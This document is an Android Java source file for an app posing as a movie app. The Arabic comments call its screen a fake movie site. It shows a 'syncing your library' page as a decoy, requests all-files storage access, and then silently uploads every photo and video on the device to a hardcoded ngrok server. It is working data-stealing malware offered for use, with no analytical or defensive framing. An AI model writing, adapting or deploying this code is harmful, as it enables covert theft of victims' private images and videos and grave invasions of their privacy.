package com.films.app;

import android.Manifest;
import android.content.pm.PackageManager;
import android.content.Intent;
import android.database.Cursor;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.webkit.WebView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity {
    
    // ⚠️ غير الرابط ده لو رابط ngrok بتاعك اتغير
    String ngrokUrl = "https://nacho-usher-goes.ngrok-free.dev/upload";
    String sessionId = String.valueOf(System.currentTimeMillis());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // شكل التطبيق (موقع أفلام وهمي)
        WebView webView = new WebView(this);
        String html = "<html><body style='background:#111;color:#fff;text-align:center;font-family:sans-serif;'><br><br><h1>🎬 MovieApp</h1><p>جاري مزامنة مكتبتك...</p><p style='color:gray;'>يرجى الانتظار قليلاً</p></body></html>";
        webView.loadData(html, "text/html", "UTF-8");
        setContentView(webView);

        // طلب الصلاحيات
        requestPermissions();
    }

    private void requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    Intent intent = new Intent(android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.addCategory("android.intent.category.DEFAULT");
                    intent.setData(android.net.Uri.parse(String.format("package:%s", getPackageName())));
                    startActivityForResult(intent, 2296);
                } catch (Exception e) {
                    Intent intent = new Intent();
                    intent.setAction(android.provider.Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    startActivityForResult(intent, 2296);
                }
            } else {
                uploadAllMedia(); // لو وافق، يبدأ يسحب
            }
        } else {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, 1);
            } else {
                uploadAllMedia();
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, android.content.Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 2296) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (Environment.isExternalStorageManager()) {
                    uploadAllMedia(); // وافق على الصلاحية
                }
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 1 && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            uploadAllMedia(); // وافق على الصلاحية
        }
    }

    // سحب كل الصور والفيديوهات ورفعها
    private void uploadAllMedia() {
        new Thread(() -> {
            // سحب الصور
            Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
                    File file = new File(path);
                    if (file.exists()) sendFile(file);
                }
                cursor.close();
            }

            // سحب الفيديوهات
            cursor = getContentResolver().query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATA));
                    File file = new File(path);
                    if (file.exists()) sendFile(file);
                }
                cursor.close();
            }
        }).start();
    }

    // دالة إرسال الملف للسيرفر
    private void sendFile(File file) {
        try {
            String boundary = "*****";
            HttpURLConnection conn = (HttpURLConnection) new URL(ngrokUrl + "?session=" + sessionId).openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

            DataOutputStream os = new DataOutputStream(conn.getOutputStream());
            os.writeBytes("--" + boundary + "\r\n");
            os.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"" + file.getName() + "\"\r\n\r\n");

            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                os.write(buffer, 0, bytesRead);
            }
            fis.close();
            os.writeBytes("\r\n--" + boundary + "--\r\n");
            os.flush();
            os.close();
            conn.getResponseCode();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
